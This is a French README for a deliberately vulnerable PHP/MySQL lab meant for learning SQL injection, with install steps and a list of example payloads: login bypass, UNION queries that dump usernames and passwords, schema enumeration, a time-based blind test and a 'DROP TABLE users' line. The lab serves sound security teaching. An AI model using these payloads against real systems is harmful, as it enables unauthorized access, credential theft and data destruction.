# Labo d'Injection SQL - Site Vulnérable

Ce projet est un environnement local vulnérable à l'**injection SQL (SQLi)**, conçu pour t’aider à apprendre les bases du hacking éthique en toute sécurité. Il inclut une page de login, une page d’accueil protégée, et des exemples pratiques pour tester les injections SQL.

> ⚠️ Ce projet est uniquement destiné à des fins pédagogiques. N'utilisez jamais ces techniques sur des systèmes sans autorisation explicite.

---

## 📁 Structure du projet
Site Vulnérable

├── index.php      : Page protégée

├── login.php      : Connexion vulnérable

├── logout.php     : Déconnexion

├── config.php     : Config BDD

├── database.sql   : Création base

├── style.css      : Style

└── README.md      : Ce fichier


---

## 🛠️ Technologies utilisées

- **PHP** – Pour la logique côté serveur
- **MySQL** – Base de données
- **HTML/CSS** – Interface utilisateur
- **PDO** – Connexion à la base de données (vulnérable dans sa version initiale)

---

## 🧱 Objectif

Ce labo permet d'apprendre :
- Comment détecter une vulnérabilité SQLi
- Comment exploiter une injection SQL manuellement
- Comment automatiser l’attaque avec `sqlmap`
- Comment corriger la faille de sécurité

---

## 🔧 Installation locale

### 1. Cloner le projet
```bash
https://github.com/HoussamElBouamraoui/sqlinjections

```
### 2. Importer la base de données
```bash
mysql -u root -p < database.sql
```
### 3. Démarrer le serveur local 

**Utilise XAMPP , WAMP , MAMP ou LAMP :**

**Place le dossier dans htdocs/ (pour XAMPP)**

**Accède au site via : http://localhost/mon-site-sql/login.php**

---


## 🧪 Exemples d’injections SQL à tester

Tu peux utiliser ces payloads SQLi pour détecter et exploiter une vulnérabilité sur ton site web.

### 🔐 Bypass du login (Login bypass)

Permet de se connecter sans connaître le mot de passe :

```sql
Nom d'utilisateur : ' OR '1'='1
Mot de passe : whatever
```

### 📚 Récupérer des données sensibles
```sql
Nom d'utilisateur : ' UNION SELECT 1, username, password FROM users--
Mot de passe : whatever
```

### 🗂️ Lister les bases de données 
```sql 
' UNION SELECT 1, schema_name, 3 FROM information_schema.schemata--
```
 
### 📄 Lister les tables d’une base 
```sql
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = 'nom_base'--
```

### 📑 Lister les colonnes d’une table
Pour trouver les noms des colonnes (ex: username, password) :
```sql
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name = 'users'--
```

### 🔍 Afficher les données d’une table
Exemple pour afficher les identifiants stockés :
```sql
' UNION SELECT 1, username, password FROM users--
```

### ⏱️ Injection SQL aveugle (Blind SQLi)
Utiliser avec une réponse basée sur le temps :
```sql
' AND IF(1=1, SLEEP(5), 0)-- 
```
Teste si le serveur met 5 secondes à répondre → injection réussie !

🧹 Supprimer une table (⚠️ Dangereux – À utiliser uniquement en labo)
Efface la table users (ne le fais QUE sur ton propre site) :
```sql
'; DROP TABLE users;--
```




